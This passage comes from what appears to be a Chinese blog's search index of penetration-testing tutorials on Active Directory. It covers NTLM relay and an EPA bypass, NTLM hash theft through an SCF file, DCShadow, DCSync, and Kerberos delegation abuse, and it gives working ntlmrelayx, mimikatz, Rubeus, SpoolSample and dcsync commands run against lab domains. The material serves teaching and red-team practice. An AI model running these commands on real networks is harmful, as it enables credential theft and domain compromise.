Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.2 实战 利用 impacket 中的 ntlmrelayx.py 进行中间人攻击，使用 --remove-mic 参数。 python3 ntlmrelayx.py -h ldap://172.16.147.130 --remove-mic --escalate-user commonuser -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:2","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"5 EPA-Bypass ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:5:0","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"5.1 原理 EPA (Enhanced Protection for Authentication)，将认证报文绑定到一个安全通道中，主要用于保护 Windows 集成认证的服务，例如OWA、ADFS、 LDAPS。 具体的做法是，在认证报文中添加一个字段 Channel Bindings，根据微软的说明，Channel Bindings 为一段 MD5 Hash 值，表示结构体 gss_channel_bindings_struct 的 MD5Hash 值。 如果启用了 EPA，在客户端发送的认证报文中，会添加一个字段 NTProofStr，这是一段签名，用来保护 Channel Bindings。微软给出 NTProofStr 的计算算法如下: 可以得知， NTProofStr 基于用户的 NTLM 值计算得来，因此，在此种攻击场景中不可能计算得出。可以使用 EPA 来保护 ADFS、OWA、 LDAPS 等基于 NTLM 认证的场景。比较悲剧的是，在默认情况下，上述这些服务器都没有强制使用了 EPA。NTProofStr 和 Channel Bindings 在实际的报文中见下图，这是一个客户端发送的认证报文。 如果我们在服务器发送挑战信息到客户端时，在挑战报文主动中添加一个 Channel Bindings 到消息块中，类似于下图所示，注意下图是服务器发送的挑战报文，由于 Channel Bindings 是一段 MD5Hash 值，是比较好添加的。 客户端收到挑战信息后，会将我们事先添加的 Channel Bindings ，并且再次计算一个新的 Channel Bindings 添加到认证报文后面，导致认证报文包含 2 个 Channel Bindings，见下图，注意这是一个客户端发送的认证报文。 在这种情况下，域服务器会选择第一个 ChannelBindings 进行校验，忽略第二个 Channel Bindings，这样我们就可以规避 EPA 的保护，实现攻击目的。 如果客户端开启了MIC保护，则和前面一样，直接丢弃 MIC 参考： https://cloud.tencent.com/developer/article/1645398 https://en.hackndo.com/ntlm-relay/#authentication-signing-mic ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:5:1","tags":["域安全","内网渗透","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"获取 NTLM","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"获取 NTLM ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:0:0","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"1 相关背景 ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:0","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"1.1 NTLM 的存储位置: 1、系统数据库 SAM (Security Account Manager) 2、DIT 数据库 3、内存 Cache ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:1","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"1.2 NTLM 的获取方式 1、从 SAM 获取 2、内存获取 3、DIT 数据库获取 4、WCE、PWDUMP、MIMIKATZ… ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:2","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"1.3 NTLM 的形式 aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 LMHash (windows 2008 R2系统以后系统默认不保存 LMHash) NTHash NetHash - 主要获取该种 hash ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:3","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"1.4 远程获取方式(窃取): 1、Responder 2、HTTP + SMB 3、SCF + SMB 4、SQL + SMB ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:4","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"ADV 170014 NTLM SSO 2017 年 10 月，微软在周二补丁日公布了一份安全公告(ADV170014)，这份安全公告中提到了 NTLM 身份验证方案中的一个漏洞，恶意攻击者可以利用这个漏洞来窃取哈希。 攻击者只需要将一个恶意的 SCF 文件放置在可公开访问的 Windows 文件夹中即可。 一旦文件被放在文件夹中，就会被一个神秘的 bug 执行。它会收集目标的 NTLM 密码散列，并将其发送到一个配置服务器中。 目标主机存在没有设置密码保护的一个共享文件夹，这种场景非常常见，比如办公室、学校、医院以及大多数 Windows 环境中，人们都会通过共享文件夹来共享音乐、照片以及文档。 ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:5","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"攻击场景 非正版系统可能没有该设置： 微软在 Windows 3.11 时引入了 SCF 文件。SCF文件其实是纯文本文件，可以用来指导 Windows 文件资源管理器执行一些基本任务。 [Shell] Command=2 IconFile=\\\\192.168.1.2\\sharetest.ico [Taskbar] Command=ToggleDesktop ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:6","tags":["域安全","内网渗透","NTLM"],"title":"获取 NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["内网渗透"],"content":"DCShadow 攻击","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"DCShadow 攻击 2018 年 1 月 24 日，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 在 BlueHat IL 会议期间公布了针对域活动目录的一种新型攻击技术 DCShadow 在具备域管理员权限条件下，攻击者可以创建伪造的域控制器，将预先设定的对象或对象属性复制到正在运行域服务器中 DCSync 从域服务器复制出东西，DCShadow 是将数据复制至域服务器 Luc Delsalle 对这种技术进行了验证和详细的描述，并就红蓝对抗中蓝队对抗此种攻击技术的缺陷和补救方法。 从 DCShadow 目前展示的功能来看，主要只能用于红蓝对抗的隐蔽后门。但是 DCShadow 第一次澄清和实现了伪造一个 DC 的最小需求合集，这个贡献非常大。以 前很多攻击方法都卡在不能伪造域服务器，例如 MS15-011 和 MS15-014 等，有了 DCShadow 的基础，相信将来会有很多新的攻击方法。 ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"流程 根据 Luc Delsalle 的描述，DCShadow 的攻击过程包括 3 个主要个步骤: 1、在目标域的 AD 活动目录注册一个伪造的 DC 中; 2、使伪造的 DC 被其他的 DC 认可，能够参与域复制 ; 3、强制触发域复制，将指定的新对象或修改后的对象属性同步复制到其他 DC 中; ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"注册伪造的 DC 一台机器要想注册成为域中的一台 DC 服务器，需要在域的活动目录中注册一个 NTDS-DSA(nTDSDSA)类对象。注册的位置为 CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com adsec.com 域有 3 台域服务器，分别是 LABDC01、RESDC01 及 WIN2016-DC01，标红的正是我们实验环境的域服务器。我们测试的机器为 Win7X86cn04，测试成功的则会生成一个新的NTDS-DSA(nTDSDSA)类对象 查看 CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com的安全描述符，可知必须有域管理员权限才具备写权限 所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改 DC Shadow 源码： ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:1","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"注册的 DC 被其他 DC 认可，能够参与域复制 一个刚注册的 DC 要想被域中其他DC认可，能够参与域复制，需要满足 3 个条件: 1、这台伪造 DC 具备认证凭证，能认证到域，即有域内账号，可以使用机器账号，实验环境中为 WIN7X86CN04$; 2、伪造 DC 能认证其他 DC 来访问的账号，如果我们给 WIN7X86CN04$ 添加 SPN，则可以实现这一点。关键是需要添加哪些SPN，DCShadow 的一个大贡献是找到 了 SPN 的最小合集，只需要 2 个即可:DRS服务(GUID 为 E3514235–4B06–11D1-AB04–00C04FC2DCD2) 和 GS(Global Catalog)服务 3、运行 DRS 服务，最少需要实现 IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs 这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口 ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:2","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"强制立即发起域复制 通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用 DRSReplicaAdd 函数接口强制立即发起域复制，DCShadow 正是通过调用 DRSReplicaAdd 函数强制立即发起域复制 ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:3","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"攻击复现 查看 CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com 的安全描述符，可知必须有域管理员权限才具备写权限 所以发动 DCShadow 攻击首先必须具备域管理员权限，但是我们可以通实验，做点手脚，就会好办一些，例如将完全权限赋予普通用户，则普通用户也可以修改 攻击时注意防火墙的设置 ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透"],"title":"DCShadow 攻击","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"DCSync 攻击","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"DCSync 攻击 2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。 DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。 DCSync 的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。 需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC 是不能参与复制同步数据 ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"原理 DCSync 的原理非常清晰，利用域控制器之间的数据同步复制。 发现网络中的目标域控制器; 通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol Samba wiki 关于 GetNCChanges 的描述包括: 当一个 DC (成为客户端 DC)想从其他 DC (成为服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数 据。 如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。 ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"前提 一个用户想发起 DCSync 攻击，必须具备以下权限: 1、Replicating Directory Changes (DS-Replication-Get-Changes) 2、Replicating Directory Changes All (DS-Replication-Get-Changes-All) 3、Replicating Directory Changes In Filtered Set 即：默认情况下域管理员组具有该权限。 ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"攻击 ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"防御 DCSync 攻击的原理是模拟域控制器发起服务器之间的数据同步复制。 最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步 获取域内所有IP的脚本: PowerShell:Get-ADDomainController -filter * | select IPv4Address 或 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress 在网络设备上检测来自白名单以外的域控制器数据同步复制 ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透"],"title":"DCSync 攻击","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"基于域委派的攻击原理及实验","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"基于域委派的攻击 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1 域委派相关定义 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.1 定义 Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request Many real-world scenarios exist in which a Web application “front end” must retrieve data from a more secure “back end”, such as a Web service that is connected to a Microsoft SQL Server database. 域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用委派可获取域管理员权限，甚至制作深度隐藏的后门 域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。 信息 在域内的可以委派的账户有两种一种是主机账户（Net Computer）另一种是用 setspn 手动添加的服务账户（Net User），不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。 服务账号(Service Account)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。 一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服务后，前台运行 WEB 服务的服务账号 websvc 模拟(Impersonate)用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中单跳或者多跳的 Kerberos 认证。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:1","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.2 流程 域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器; Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请; KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT; websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 ST; KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 ST; websvc 收到的 jack 用户的授权票据 ST 后，可访问文件服务，完成多跳认证。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:2","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1.3 委派类型 域内委派主要有 3 种应用方式: 一是非约束性委派(Unconstrained Delegation)，服务账号可以获取某用户的 TGT，从而服务账号可使用该 TGT，模拟用户访问任意服务 二是约束性委派(Constrained Delegation)，即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 ST，从而只能模拟用户访问特定的服务 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:3","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2 非约束委派 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2.1 原理 如果某个服务 A 的服务账号 B 被设置为非约束委派，当用户 C 通过 Kerberos 认证访问服务 A 时，KDC 会检查服务账号 B 的属性，发现是非约束性委派时，KDC 会将用户 C 的 TGT 放在 ST 中，这样 B 在验证 ST 的同时获取了 A 用户的 TGT，从而可以模拟用户 A 访问任意服务。 开启委派后，在该用户的 userAccountControl 属性会多出一个 flag：WORKSTATION_TRUSTED_FOR_DELEGATION 非约束委派的设置需要 SeEnableDelegation 特权，该特权通常仅授予域管理员。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:1","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2.2 实战 2.2.1 非约束委派的查找 2.2.1.1 adfind 查询非约束委派的主机： AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 查询非约束委派的用户： AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 2.2.1.2 powerview 注：PowerSploit-dev 分支 查询配置非约束委派的用户：Get-NetUser -Unconstrained -Domain pentest.com 查询配置非约束委派的主机：Get-domaincomputer -Unconstrained -Domain pentest.com 2.2.1.3 ldapsearch 信息 需要域内任意用户的账号密码 查询非约束委派的机器： ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D \"win7user@pentest.com\" -w \"123456bY\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 查询非约束委派的用户： ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D \"win7user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 2.2.2 非约束委派的利用 2.2.2.1 管理员模拟访问 信息 实验前建议清除内存中的票据，mimikatz 下：kerberos::purge 模拟管理员调用非约束性委派机的 smb 服务：net use \\\\win7\\c$ 回到非约束委派机，查看票据(部分截图)： privilege::debug sekualsa::tickets TGT 被截获，我们用 sekurlas::tickets /export 把票据导出来 此时我们访问域控是被拒绝的： 然后 mimikatz 里使用 kerberos::ptt 票据文件名 将票据注入内存： 可以成功访问。 如果想执行命令，可以使用 WinRM 服务来远程连接域控服务器： Enter-PSSession -ComputerName DC 2.2.2.2 Spooler Printer Bug 在实战中，只是单纯的非约束委派话需要管理员主动连接比较鸡肋。因此可以利用非约束委派 + Spooler 打印机服务可以强制指定的主机进行连接。 利用原理：利用 Windows 打印系统远程协议 (MS-RPRN) 中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) 方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证。 POC：https://github.com/leechristensen/SpoolSample 向 DC 的 Spooler 服务发送请求，强制其访问 win7 进行身份验证：SpoolSample.exe DC win7 可以用 Rubeus 来监听 Event ID 为 4624 事件，这样可以第一时间截取到域控的，每隔一秒监听一次来自 DC 的登陆（需要本地管理员权限）TGT：Rubeus.exe monitor /interval:1 /filteruser:DC$ 注：Rubeus.exe 捕获到的 TGT 是 base64 编码的，但是我们不需要解码，Rubeus 可以直接将 base64 编码的票据直接注入到内存中：Rubeus.exe ptt /ticket:base64 得到 TGT 之后，利用 PTT 将票据注入到当前会话后，可以用 dcsync 导出域控中所有用户的 hash，然后用 krbtgt 用户的 hash 生成黄金票据。 kerberos::ptt xxxx.kirbi lsadump::dcsync /domain:test.local /all /csv ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:2","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3 约束委派 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.1 原理 由于非约束委派的不安全性，微软在 windows server 2003 中引入了约束委派，对 Kerberos 协议进行了拓展，引入了 S4U，其中 S4U 支持两个子协议：Service for User to Self (S4U2Self) 和 Service for User to Proxy (S4U2proxy)，这两个扩展都允许服务代表用户从 KDC 请求票证。S4U2self 可以代表自身请求针对其自身的 Kerberos 服务票据(ST)；S4U2proxy 可以以用户的名义请求其它服务的 ST，约束委派就是限制了 S4U2proxy 扩展的范围。 S4U2Self 和 S4U2proxy 的请求过程（图来自微软手册）： 其中步骤 1-4 代表 S4U2Self 请求的过程，步骤 5-10 代表 S4U2proxy 的请求过程 用户向 service1 发出请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。 KDC 返回给 Service1 一个用于用户验证 Service1 的 ST1，该 ST1 可能包含用户的授权数据。 service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。 注：尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了 用户向 service1 发出请求，service1 需要以用户身份访问 service2 上的资源。 service1 以用户的名义向 KDC 请求用户访问 service2 的 ST2 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。 service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。 service2 响应步骤 8 的请求。 service1 响应用户对步骤 5 中的请求。 当被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)，且 msDS-AllowedToDelegateTo 属性会被设置为哪些协议 由此可以看出，约束委派不需要其它用户主动请求可以模拟用户。当拿下一个配置约束委派的用户，就可以拿下配置对应委派主机的权限。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:1","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.2 实战 3.2.1 约束委派的查找 3.2.1.1 adfind 查询约束委派的主机： AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 查询约束委派的用户： AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 3.2.1.2 powerview 查询约束委派的主机： Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto 查询约束委派的用户： Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl 3.2.1.3 ldapsearch 查询约束委派的机器： ldapsearch -LLL -x -H ldap://IP:389 -D \"user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 查询约束委派的用户： ldapsearch -LLL -x -H ldap://IP:389 -D \"user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 3.2.2 